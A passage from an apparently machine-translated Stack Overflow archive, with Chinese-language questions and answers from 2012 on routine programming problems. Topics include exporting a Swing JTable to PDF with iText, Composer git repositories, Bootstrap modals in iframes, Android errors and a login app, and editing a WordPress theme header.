import com.itextpdf.text.pdf.PdfTemplate;
import com.itextpdf.text.pdf.PdfWriter;

class TableImage {

    public static void main(String[] args) throws Exception {
        Object[][] data = {
            {"Hari", new Integer(23), new Double(78.23), (true)},
            {"James", new Integer(23), new Double(47.64), (false)},
            {"Sally", new Integer(22), new Double(84.81), (true)}
        };
        String[] columns = {"Name", "Age", "GPA", "Pass"};
        JTable table = new JTable(data, columns);
        JScrollPane scroll = new JScrollPane(table);
        JPanel p = new JPanel(new BorderLayout());
        p.add(scroll, BorderLayout.CENTER);
        JOptionPane.showMessageDialog(null, p);
        JTableHeader h = table.getTableHeader();
        int x = table.getWidth();
        int y = table.getHeight();
        table.setIntercellSpacing(new Dimension(0,0));
        table.setDefaultRenderer(Object.class, new ColumnAlignmentRenderer(table.getDefaultRenderer(Object.class)));
        BufferedImage bi = new BufferedImage(
                x, y, BufferedImage.TYPE_INT_RGB);
        Graphics g = bi.createGraphics();
        Graphics2D g2 = (Graphics2D) g;
        table.paint(g2);
        JOptionPane.showMessageDialog(null, new JLabel(new ImageIcon(bi)));
        print(table);
    }
    private static void print(JTable table) {
        Document document = new Document(PageSize.A4.rotate());
        try { 
            PdfWriter writer = PdfWriter.getInstance(document, new FileOutputStream("F://jTable.pdf")); 

            document.open(); 
            PdfContentByte cb = writer.getDirectContent(); 

            cb.saveState();

            PdfTemplate pdfTemplate = cb.createTemplate(table.getWidth(), table.getHeight());
            Graphics2D g2 = pdfTemplate.createGraphics(table.getWidth(), table.getHeight());

            table.print(g2);
            cb.addTemplate(pdfTemplate, 20, 100);
            g2.dispose();
            cb.restoreState();
            } catch (Exception e) { 
            System.err.println(e.getMessage()); 
            } 

        document.close();

      }

    private TableImage() {
    }
} 
```

**

*   列对齐渲染器

**

```
package com.swing.data;

import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.font.TextAttribute;
import java.util.HashMap;
import java.util.Map;

import javax.swing.BorderFactory;
import javax.swing.JLabel;
import javax.swing.JTable;
import javax.swing.SwingConstants;
import javax.swing.border.Border;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableCellRenderer;

public class ColumnAlignmentRenderer extends DefaultTableCellRenderer {

    private TableCellRenderer mWrappedRenderer;
    private HashMap objFormatCellMap;

    public ColumnAlignmentRenderer(TableCellRenderer pWrappedRenderer) {
        mWrappedRenderer = pWrappedRenderer;
    }

    public Component getTableCellRendererComponent(JTable pTable,
            Object pValue, boolean pIsSelected, boolean pHasFocus, int pRow,
            int pColumn) {
        int hAlignment = SwingConstants.LEFT;
        int vAlignment = SwingConstants.CENTER;
        String pattern = "##000.0";
        Font font = pTable.getFont();
        Border cellBorder = pTable.getBorder();
        Map fontAttributes = font.getAttributes();
        fontAttributes.put(TextAttribute.STRIKETHROUGH,TextAttribute.STRIKETHROUGH_ON);
        fontAttributes.put(TextAttribute.UNDERLINE, TextAttribute.UNDERLINE_ON);
        font = font.deriveFont(fontAttributes);
        // Border cellBorder = BorderFactory.createCompoundBorder();
        Color backgroundColor = Color.WHITE;
        Color foregroundColor = Color.BLACK;
        // Use the wrapped renderer
        Component renderedComponent = mWrappedRenderer.getTableCellRendererComponent(pTable, pValue, pIsSelected,
                        pHasFocus, pRow, pColumn);

        int iLeft = 1;
        int iRight = 1;
        int iTop = 1;
        int iBottom = 1;

        if (pRow == 0) {
            ((JLabel) renderedComponent).setFont(font);
        }
        if (pIsSelected) {
            renderedComponent.setBackground(pTable.getSelectionBackground());
        }
        return renderedComponent;
    }

    public void setHashFormatCellData(HashMap hashFormatCellData) {
        this.objFormatCellMap = hashFormatCellData;
    }

} 
```

**

*   更新1：-

** 你所有的链接真的很有帮助！但是我使用以下代码在 JOPtionPane 上获得了正确的图像：-

```
 BufferedImage bi = new BufferedImage(
            x, y, BufferedImage.TYPE_INT_RGB);
    Graphics g = bi.createGraphics();
    Graphics2D g2 = (Graphics2D) g;
    table.paint(g2);
    JOptionPane.showMessageDialog(null, new JLabel(new ImageIcon(bi))); 
```

从上面的代码表图像带有删除线和下划线单元格。但是使用导致pdf输出的代码，显示单元格内容没有删除线和下划线。

```
 PdfContentByte cb = writer.getDirectContent(); 
            cb.saveState();
            table.addNotify();
            table.doLayout();
            PdfTemplate pdfTemplate = cb.createTemplate(table.getWidth(), table.getHeight());
            Graphics2D g2 = pdfTemplate.createGraphics(table.getWidth(), table.getHeight());
            table.printAll(g2);
            cb.addTemplate(pdfTemplate, 20, 100);
            g2.dispose();
            cb.restoreState(); 
```

请看看上面并提出一些建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:15:24.590

remove 遵循 3\. 代码行，因为要创建一个快照，该快照将在来自 repaint() 所需的 Container 或 JComponents 的第一个事件时过期（在 API 中实现）

```
Graphics g = bi.createGraphics();
Graphics2D g2 = (Graphics2D) g;
table.paint(g2); 
```

请参阅[打印](http://docs.oracle.com/javase/tutorial/2d/printing/index.html)教程，尤其是[Swing 组件中的打印支持](http://docs.oracle.com/javase/tutorial/2d/printing/swing.html)，教程包含可运行的代码示例，

@Andrew Thompson的[JTableHeader 和 BufferedImage](https://stackoverflow.com/questions/7369814/why-does-the-jtable-header-not-appear-in-the-image)很常见的问题

# php - 从多维到数组的值

> ID：12954043
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:30.823
> 
> 标签：php, arrays

数组在其他地方获取：

```
Array
(
    [0] => Array
        (
            [id] => 600000
            [name] => test1
        )

    [1] => Array
        (
            [id] => 600300
            [name] => test2
        )

    [2] => Array
        (
            [id] => 600600
            [name] => test3
        )
) 
```

php:

```
$leftnav = array("root_id" => 0, "sub_id" => 0, "subsub_id" => 0, "subsubsub_id" => 0);

if (isset($category_data[0]['id']))
$leftnav['root_id'] = $category_data[0]['id'];

if (isset($category_data[1]['id']))
$leftnav['sub_id'] = $category_data[1]['id'];

if (isset($category_data[2]['id']))
$leftnav['subsub_id'] = $category_data[2]['id'];

if (isset($category_data[3]['id']))
$leftnav['subsubsub_id'] = $category_data[3]['id']; 
```

php代码可以用更漂亮的方式完成吗？我尝试过使用 array_map，但不会设置 $leftnav 中的所有必需键。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:03:14.830

```
$i = 0;
foreach( $leftnav as $k => $v ) {
    if ( isset($category_data[$i]['id']) ) {
        $leftnav[$k] = $category_data[$i]['id'];
    }
    $i++;
} 
```

# java - 在 Eclipse/IntelliJ 中嵌入 Web 应用程序

> ID：12954046
> 
> 赞同：1
> 
> 时间：2012-10-18T11:56:44.053
> 
> 标签：java, web-applications, eclipse-plugin, intellij-idea, intellij-plugin

我有几个关于 Eclipse 和 IntelliJ IDEA 支持构建插件的问题，该插件可以...

1.  在 IDE 的主工作区（右侧最大的空间：））内显示（并接受用户输入）交互式 Web 应用程序（具有类似于 Visio/OmniGrapffle/Inkscape 的拖放图表编辑功能）。

2.  与 Web 应用程序的交互（例如单击图中的框）将触发 IDE 中的某些操作（例如显示相应的源文件，或打开对话框以创建新类）。

换句话说，我计划让 Web 应用程序管理大部分 GUI 方面，以克服 Eclipse 和 IDEA 在动画方面的限制，或者在显示漂亮图形方面的灵活性。

为此，Web 应用程序需要能够与 IDE 中提供的服务/其他插件进行通信。

浏览 Web 和 StackOverflow 向我揭示了 Eclipse 支持 OSGI 架构，这可能使我能够编写可以从 Web 应用程序访问的 Web 服务。但我不确定从哪里开始。也找不到有关为 IntelliJ IDEA 构建我的插件的相关信息。

如果您能给我一些建议，那就太好了。非常感谢。

PS：我正在考虑构建一个普通插件（例如，使用 Eclipse 的[Graphiti](http://www.eclipse.org/graphiti/)项目），但仅使用 Eclipse 平台支持的用户体验（按钮的形状、对话框、属性窗口等）似乎有限，而不是完整的 HTML/CSS/ Web 应用程序支持的 JavaScript/etc/。不过，我的方法可能有误，因此我们将不胜感激。

# twitter-bootstrap - Twitters bootstrap modal 在 iframe 中弹出

> ID：12954047
> 
> 赞同：4
> 
> 时间：2012-10-18T11:56:44.960
> 
> 标签：twitter-bootstrap

在 Twitter Bootstrap 中，可以开箱即用地显示网站上显示的模态对话框。但我在现有的 web 应用程序中使用它，它使用了很多 iframe。问题是; 如果您在 iframe 内打开一个 TB 模态，它会在该 iframe 内居中显示。我想在当前打开的页面上显示它的模式。使用模态背景/阴影。但是如何..？我试过“window.parent.parent.document.*”，但没有显示内容。 [例子](http://www.w3resource.com/html5/html5-editor/edit_html.php)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-19T08:04:52.697

我使用辅助方法来注入/更新模态。它适用于您的 iframe 场景。

在 iframe 中：

```
$(function() {
  window.parent.renderModal(".my-modal-class", "My modal content");
}); 
```

renderModal 需要在父页面范围内可用。这是它的代码：

```
function renderModal(selector, html, options) {
  var parent = "body",
      $this = $(parent).find(selector);

  options = options || {};
  options.width = options.width || 'auto';

  if ($this.length == 0) {
    var selectorArr = selector.split(".");
    var $wrapper = $('<div class="modal hide fade ' + selectorArr[selectorArr.length-1] + '"></div>').append(html);
    $this = $wrapper.appendTo(parent);
    $this.modal();
  } else {
    $this.html(html).modal("show");
  }

  $this.css({
    width: options.width,
    'margin-left': function () {
      return -($(this).width() / 2);
    }
  });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-07T12:11:35.473

如果您使用的是 jquery，它会变得更清晰一些。

在你的 iframe 页面上（我有一个按钮）

```
 $('#tasks-modal').click(function(){
        window.parent.renderModal('#taskModal');
  }); 
```

您在哪里传递模型 ID。注意：模式代码必须加载到您调用它的顶部框架上。

然后在那个顶部框架中，您只需：

```
function renderModal(selector) {
      $(selector).modal('show');
} 
```

效果很好......

# android - 无法解决 ClassNotFoundException 的问题？

> ID：12954049
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:45.410
> 
> 标签：android, google-maps, exception

大家好，我正在使用此处给出的代码 [在 Android 上获取用户当前位置的最简单、最可靠的方法是什么？](https://stackoverflow.com/questions/3145089/what-is-the-simplest-and-most-robust-way-to-get-the-users-current-location-in-a/3145655#3145655) 获取当前位置但我得到了`ClassNotFoundExecption`这是我的完整代码：

//地图活动代码：

```
package com.example.gmaps;
import com.example.gmaps.MyLocation.LocationResult;
import com.google.android.maps.MapActivity;
import android.location.Location;
import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import android.widget.Toast;

public class MainActivity extends MapActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    LocationResult locationResult = new LocationResult(){
        @Override
        public void gotLocation(Location location){
            //Got the location!

            Toast.makeText(getApplicationContext(), "I got the location", Toast.LENGTH_LONG).show();
        }
    };
    MyLocation myLocation = new MyLocation();
    myLocation.getLocation(MainActivity.this, locationResult);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

@Override
protected boolean isRouteDisplayed() {
    // TODO Auto-generated method stub
    return false;
} 
```

}

在 MyLocation 中，我的代码与上面链接中给出的代码相同 这是我的 logcat

```
> 10-18 16:49:51.222: E/AndroidRuntime(24816): FATAL EXCEPTION: main
10-18 16:49:51.222: E/AndroidRuntime(24816): java.lang.RuntimeException: Unable to instantiate activity ComponentInfo{com.example.gmaps/com.example.gmaps.MainActivity}: java.lang.ClassNotFoundException: com.example.gmaps.MainActivity
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1993)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2104)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread.access$600(ActivityThread.java:132)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1157)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.os.Handler.dispatchMessage(Handler.java:99)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.os.Looper.loop(Looper.java:137)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread.main(ActivityThread.java:4575)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at java.lang.reflect.Method.invokeNative(Native Method)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at java.lang.reflect.Method.invoke(Method.java:511)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:789)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:556)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at dalvik.system.NativeStart.main(Native Method)
10-18 16:49:51.222: E/AndroidRuntime(24816): Caused by: java.lang.ClassNotFoundException: com.example.gmaps.MainActivity
10-18 16:49:51.222: E/AndroidRuntime(24816):    at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:61)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at java.lang.ClassLoader.loadClass(ClassLoader.java:501)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at java.lang.ClassLoader.loadClass(ClassLoader.java:461)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.Instrumentation.newActivity(Instrumentation.java:1023)
10-18 16:49:51.222: E/AndroidRuntime(24816):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1984)
10-18 16:49:51.222: E/AndroidRuntime(24816):    ... 11 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:06:32.510

您是否在 AndroidManifest.xml 中添加了上述代码？

```
<uses-library android:name="com.google.android.maps" /> 
```

您必须在应用程序标记之间添加此代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:05:30.897

右键单击项目并转到属性->> java build path..单击库选项卡并单击添加外部 jar 并从您的计算机中选择 maps.jar...现在转到订购和导出选项卡并勾选复选框maps.jar ....现在...清理您的项目并运行...

# video - 如何嵌入实时视频 - 连接失败应用程序拒绝连接

> ID：12954050
> 
> 赞同：3
> 
> 时间：2012-10-18T11:56:46.753
> 
> 标签：video

我尝试了很多方法来获得将此直播视频嵌入到我的网站的正确路径：“http://www.turbotv.in/mazhavil-manorama-live/”，但无法做到。JW 播放器说“连接失败：应用程序拒绝连接”

[现在我需要一个知道这一点的人从这个网站http://www.turbotv.in/mazhavil-manorama-live/](http://www.turbotv.in/mazhavil-manorama-live/)中找出正确的嵌入代码 ，这样我就可以将实时视频嵌入我的网站。

现在需要一个早期的解决方案。一个早期的答复总是赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:43:20.157

JWPlayer 在该站点上播放的 URL 作为参数提供给 HTML 中的 JWPlayer 嵌入代码：

```
<param name="flashvars" value="
       netstreambasepath=http%3A%2F%2Fwww.turbotv.in%2Fmazhavil-manorama-live%2F&amp;
       id=jwplayer-2&amp;
       flashplayer=http%3A%2F%2Fwww.turbotv.in%2Fwp-content%2Fuploads%2Fjw-player-plugin-for-wordpress%2Fplayer%2Fplayer.swf&amp;
       autostart=true&amp;
       repeat=none&amp;
       shuffle=false&amp;
       bufferlength=5&amp;
       smoothing=true&amp;
       stretching=exactfit&amp;
       wmode=opaque&amp;
       mute=false&amp;
       volume=30&amp;
       mediaid=538&amp;
       image=http%3A%2F%2Fwww.turbotv.in%2Fwp-content%2Fuploads%2F2012%2F09%2FMazhavil-Manorama-Logo.jpg&amp;
       streamer=rtmp%3A%2F%2F37.130.230.101%2Fbase2%2F&amp;
       file=maha2.stream&amp;
       controlbar.position=bottom&amp;
       playlist.position=none&amp;
       playlist.size=180&amp;
       display.icons=true&amp;
       dock=false"> 
```

当然，这些值是 url 编码的，并且是 HTML 编码的。您感兴趣的关键参数是“streamer”和“file”——这些是 RTMP 流的参数。您可以查看[JWPlayer 文档](http://www.longtailvideo.com/support/jw-player/jw-player-for-flash-v5/12536/configuration-options)了解它们的语义。

当然，您还需要确保获得发布商的许可才能在您的网站上嵌入视频频道。但我想这对于 StackOverflow 来说是题外话。

# php - 使用 PHP composer 克隆 git repo

> ID：12954051
> 
> 赞同：129
> 
> 时间：2012-10-18T11:56:47.830
> 
> 标签：php, composer-php, packagist

我正在尝试使用[composer](http://getcomposer.org/)从github自动克隆一个不在[packagist](https://packagist.org/)中的git存储库，但它不起作用，我不知道我做错了什么。

我认为我必须将它包含在“存储库”中，如下所示：

```
"repositories": [
    {
        "url": "https://github.com/l3pp4rd/DoctrineExtensions.git",
        "type": "git"
    }
], 
```

然后可能在“要求”部分列出它。它应该类似于[此示例](http://getcomposer.org/doc/05-repositories.md#package-2)，但它不起作用。它只是给出了这个错误：

> 您的要求无法解决为一组可安装的软件包。

有没有人尝试过做这样的事情？

* * *

## 回答 #1

> 赞同：156
> 
> 时间：2012-10-18T15:13:48.197

该软件包实际上[可以通过 packagist 获得](https://packagist.org/packages/gedmo/doctrine-extensions)。在这种情况下，您不需要自定义存储库定义。只需确保添加一个`require`（始终需要）具有匹配的版本约束。

通常，如果 packagegist 上有包可用，**请不要**添加 VCS 存储库。它只会减慢速度。

* * *

对于无法通过 packagist 获得的软件包，请使用[VCS](http://getcomposer.org/doc/05-repositories.md#vcs)（或 git）存储库，如您的问题所示。当你这样做时，请确保：

*   “存储库”字段在根 composer.json 中指定（它是一个仅根字段，来自所需包的存储库定义被忽略）
*   存储库定义指向有效的 VCS 存储库
*   如果类型是“git”而不是“vcs”（如您的问题），请确保它实际上是一个 git repo
*   你有一个有`require`问题的包裹
*   约束中的约束`require`与 VCS 存储库提供的版本相匹配。您可以使用它`composer show <packagename>`来查找可用的版本。在这种情况下`~2.3`将是一个不错的选择。
*   中的`require`名称与远程中的名称匹配`composer.json`。在这种情况下，它是`gedmo/doctrine-extensions`。

`composer.json`这是一个通过 VCS 存储库安装相同包的示例：

```
{
    "repositories": [
        {
            "url": "https://github.com/l3pp4rd/DoctrineExtensions.git",
            "type": "git"
        }
    ],
    "require": {
        "gedmo/doctrine-extensions": "~2.3"
    }
} 
```

[VCS repo 文档](http://getcomposer.org/doc/05-repositories.md#vcs)很好地解释了所有这些。

* * *

如果有可用的 git（或其他 VCS）存储库`composer.json`，**请不要**使用“包”存储库。包 repos 要求您提供定义中的*所有*元数据，并且将*完全忽略*提供的 dist 和源中的任何`composer.json`存在。它们还有其他限制，例如在大多数情况下不允许正确更新。

避免包 repos（[另见文档](http://getcomposer.org/doc/05-repositories.md#package-2)）。

* * *

## 回答 #2

> 赞同：127
> 
> 时间：2013-01-23T17:28:07.340

在 2013 年撰写本文时，这是一种方法。Composer 增加了对更好方法的支持：参见@igorw 的[回答](https://stackoverflow.com/a/12957929/1114274)

**你有存储库吗？**

Composer 支持 Git、Mercurial 和 SVN。

**您对存储库有写入权限吗？**

是的？

**存储库有`composer.json`文件吗**

如果您有一个存储库，您可以写入：添加`composer.json`文件，或修复现有文件，不要使用下面的解决方案。

转到@igorw 的[答案](https://stackoverflow.com/a/12957929/1114274)

**仅当您没有存储库**
**或存储库没有 A`composer.json`并且您无法添加它时才使用它**

这将覆盖 Composer 可能能够从原始存储库中读取的所有内容`composer.json`，包括包的依赖项和自动加载。

使用`package`类型会将正确定义所有内容的负担转移到您身上。更简单的方法是在存储库中有一个`composer.json`文件，然后使用它。

此解决方案实际上仅适用于您无法更改的废弃 ZIP 下载或您只能阅读但不再维护的存储库的极少数情况。

```
"repositories": [
    {
        "type":"package",
        "package": {
          "name": "l3pp4rd/doctrine-extensions",
          "version":"master",
          "source": {
              "url": "https://github.com/l3pp4rd/DoctrineExtensions.git",
              "type": "git",
              "reference":"master"
            }
        }
    }
],
"require": {
    "l3pp4rd/doctrine-extensions": "master"
} 
```

* * *

## 回答 #3

> 赞同：52
> 
> 时间：2014-12-11T13:14:32.890

您可以像这样将 git 存储库包含到 composer.json：

```
"repositories": [
{
    "type": "package",
    "package": {
        "name": "example-package-name", //give package name to anything, must be unique
        "version": "1.0",
        "source": {
            "url": "https://github.com/example-package-name.git", //git url
            "type": "git",
            "reference": "master" //git branch-name
        }
    }
}],
"require" : {
  "example-package-name": "1.0"
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2016-07-12T21:19:47.363

只需告诉作曲家使用源（如果有）：

```
composer update --prefer-source 
```

或者：

```
composer install --prefer-source 
```

然后，您将获得作为克隆存储库而不是提取的 tarball 的包，因此您可以进行一些更改并将它们提交回来。当然，假设您对存储库具有写入/推送权限，并且 Composer 知道项目的存储库。

免责声明：我想我可能会回答一些不同的问题，但这正是我发现这个问题时所寻找的，所以我希望它对其他人也有用。

如果 Composer 不知道项目的存储库在哪里，或者项目没有正确的 composer.json，情况会有点复杂，但其他人已经回答了这样的场景。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2015-06-27T23:19:51.660

我遇到了以下错误：`The requested package my-foo/bar could not be found in any version, there may be a typo in the package name.`

如果您要分叉另一个 repo 来进行自己的更改，您最终会得到一个新的存储库。

例如：

```
https://github.com/foo/bar.git
=>
https://github.com/my-foo/bar.git 
```

新的 url 需要进入 composer.json 的存储库部分。

`my-foo/bar`请记住，如果您想在 require 部分中引用您的 fork ，则必须在`composer.json`新 repo 内的文件中重命名包。

```
{
    "name":         "foo/bar",

=>

{
    "name":         "my-foo/bar", 
```

如果您刚刚分叉了最简单的方法，那就是在 github 中对其进行编辑。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2020-07-15T15:29:30.947

我尝试加入这里提到的解决方案，因为它需要列出一些重要的点。

1.  正如@igorw 的回答中提到的那样，在这种情况下，存储库的 URL 必须在 composer.json 文件中指定，但是因为在这两种情况下，composer.json 都必须存在（不像@Mike Graf 的第二种方式）在Packagist 上发布它是差别不大（此外，Github 目前也以 npm 包的形式提供包服务），唯一的区别是注册后在 packagist 界面上直接输入 URL。

2.  此外，它的缺点是它不能依赖使用这种方法的外部库，因为递归存储库定义在 Composer 中不起作用。此外，由于它，它似乎有一个“错误”，因为递归定义在依赖项中失败，在根目录中显式重新指定存储库似乎还不够，而且包中的所有依赖项都必须被重新指定。

**使用**作曲家文件**（2012 年 10 月 18 日 15:13 igorw 回答）**

```
{
    "repositories": [
        {
            "url": "https://github.com/l3pp4rd/DoctrineExtensions.git",
            "type": "git"
        }
    ],
    "require": {
        "gedmo/doctrine-extensions": "~2.3"
    }
} 
```

**没有**作曲家文件**（2013 年 1 月 23 日 17:28 Mike Graf 回答）**

```
"repositories": [
    {
        "type":"package",
        "package": {
          "name": "l3pp4rd/doctrine-extensions",
          "version":"master",
          "source": {
              "url": "https://github.com/l3pp4rd/DoctrineExtensions.git",
              "type": "git",
              "reference":"master"
            }
        }
    }
],
"require": {
    "l3pp4rd/doctrine-extensions": "master"
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-11-13T13:41:58.307

就我而言，我使用 Symfony2.3.​​x 并且最小稳定性参数默认为“稳定”（这很好）。我想导入不在 packagist 中的 repo，但遇到了同样的问题“您的要求无法解决为一组可安装的软件包。”。我尝试导入的仓库中的 composer.json 似乎使用了最低稳定性的“开发”。

因此，要解决此问题，请不要忘记验证`minimum-stability`. 我通过要求一个`dev-master`版本而不是本文中`master`所述的方式解决了这个[问题](https://groups.google.com/forum/#!topic/composer-dev/_g3ASeIFlrc/discussion)。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2012-10-18T12:51:39.503

如果你想使用`composer.json`GitHub 中的一个，你可以查看[这个示例](http://getcomposer.org/doc/05-repositories.md#vcs)（在 VCS 部分下）。

package 部分适用于没有`composer.json`. 但是，您也没有遵循该示例，否则它也会起作用。请阅读它关于包存储库的内容：

> 基本上，您定义了包含在作曲家存储库中的相同信息`packages.json`，但仅适用于单个包。同样，最少的必填字段是名称、版本以及 dist 或 source。

# php - Android 登录应用程序不接受 NameValuePair 参数

> ID：12954054
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:52.557
> 
> 标签：php, android, wamp

我的 Android 登录应用程序出现问题。该应用程序将获取用户名和密码并单击按钮登录，该数据将发送到我的 Wamp 服务器中的 URL，以使用 PHP 搜索用户的名称和密码，然后将数据编码为 JSON。

如果用户在数据库中，则返回 JSON 对象中值为 1 的成功属性，或者如果用户不在数据库中，则返回成功值为 0。我在 namevaluepair 参数下放置了一个 logcat，用于发布用户名和密码。

但是，当我在 AVD 中运行应用程序时，我返回 Toast 说连接错误，当我检查 logcat 时，我从我在名称值对下设置的名称值对中收到一个错误，说未发送查询。我不知道我做错了什么。

这是代码

**JsonParser.java**

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair; 
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity; 
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONException;
import org.json.JSONObject;

import android.util.Log;

public class JSONParser {

    private InputStream is = null;
    private JSONObject jObj = null;
    private String json;

    // constructor
    public JSONParser() {

    }

    public JSONObject getJSONFromUrl(String url, List<NameValuePair> params) {

        // Making HTTP request
        try {
            // defaultHttpClient
            DefaultHttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(url);
            httpPost.setEntity(new UrlEncodedFormEntity(params));

            HttpResponse httpResponse = httpClient.execute(httpPost);
            HttpEntity httpEntity = httpResponse.getEntity();
            is = httpEntity.getContent();

        } catch (UnsupportedEncodingException e) {
            Log.e("unsupported encoding", e.toString());

        } catch (ClientProtocolException e) {
            //e.printStackTrace();
            Log.e("client protocol error", e.toString());
        } catch (IOException e) {
            //e.printStackTrace();
            Log.e("IO error", e.toString());
        }

        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }
            json = sb.toString();
              is.close();
            Log.e("JSON", json);
        } catch (Exception e) {
            Log.e("Buffer Error", "Error converting result " + e.toString());
        }

        // try parse the string to a JSON object
        try {
            jObj = new JSONObject(json);
        } catch (JSONException e) {
            Log.e("JSON Parser", "Error parsing data " + e.toString());
        }

        // return JSON String
        return jObj;
    }
} 
```

**登录活动.java**

```
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.os.Bundle;
import android.app.Activity;
import android.content.SharedPreferences;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class LoginActivity extends Activity implements OnClickListener {

    private EditText user_name;
    private EditText user_password;
    private Button   login_button;

    // URL to make request
    private static final String URL = "http://10.0.2.2/HMS2/services.php";
    private static final String SUCCESS = "success";

    JSONParser jParser = new JSONParser();
    JSONObject json = new JSONObject();

    //String object that will store the user input from the edit text widget
    String user;
    String pass;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);

        user_name = (EditText) findViewById(R.id.username);
        user_password = (EditText) findViewById(R.id.userpassword);
        login_button = (Button)findViewById(R.id.login_button);

        //waits for the button to be clicked 
        login_button.setOnClickListener(this);
    }

    public void onClick(View v) {

        // Building Parameters
        List<NameValuePair> params = new ArrayList<NameValuePair>(2);

        //gets the user's name from edit text widget and stores it in a variable
        user = user_name.getText().toString();
        user.trim();

        //gets the user's name from the edit text widget and stores it in a variable
        pass = user_password.getText().toString();
        pass.trim();

        params.add(new BasicNameValuePair("username", user));
        params.add(new BasicNameValuePair("password", pass));
        Log.e("error", "did not get the query");

        //return a JSON object
        json = jParser.getJSONFromUrl(URL, params);
        Log.e("error", "did not get back json");

        try {   
            //returns a the key value
            int success = json.getInt(SUCCESS);

            if(success == 1) {
                Toast.makeText(this, " Toast.LENGTH_LONG).show();
            } else {
                Toast.makeText(this, "Wrong username or password", Toast.LENGTH_LONG).show();
            }
        } catch(Exception e) {
            Toast.makeText(this, "Connection problem", Toast.LENGTH_LONG).show();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:22:04.720

代码的结构方式每次运行时都会看到这些消息。无论错误情况如何。如果您想测试错误，请检查“getJSONFromUrl”的返回值或将该行放在 try/catch 中。

消息“字符 0 处的输入结束”听起来像是服务器正在向您发送一个空字符串。您可以发布该代码吗？

# php - Wordpress - 如何编辑模板的标题？

> ID：12954055
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:55.113
> 
> 标签：php, wordpress, layout, themes

我是使用 Wordpress 的新手。我下载[了这个](http://www.web2feel.com/gordon/)主题，因为我的网站标题太长，我需要更改这个主题的标题。

于是我走进

> wp-content/themes/Gordon/header.php

我尝试更新此文件，但我所做的更改没有出现在页面上。所以我删除了这个文件的全部内容（空白文件），当我重新加载主页时 - 再次 - 没有任何改变，没有错误，什么都没有。

所以我想问你，如何在 Wordpress 中更新已安装主题的标题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:01:02.137

您搞砸了 header.php，解决它的最佳方法是从原始主题（下载）打开 header.php，然后使用 FTP 将代码复制/粘贴到在线的 header.php。

使用一键式子主题插件创建子主题，再次使用 FTP 连接将 header.php 复制到该子主题中。

然后在此处进行编辑或添加 style.css 以使用 css 编辑标题。

**有用的链接**

[http://codex.wordpress.org/Child_Themes](http://codex.wordpress.org/Child_Themes)

[http://wordpress.org/extend/plugins/one-click-child-theme/](http://wordpress.org/extend/plugins/one-click-child-theme/)

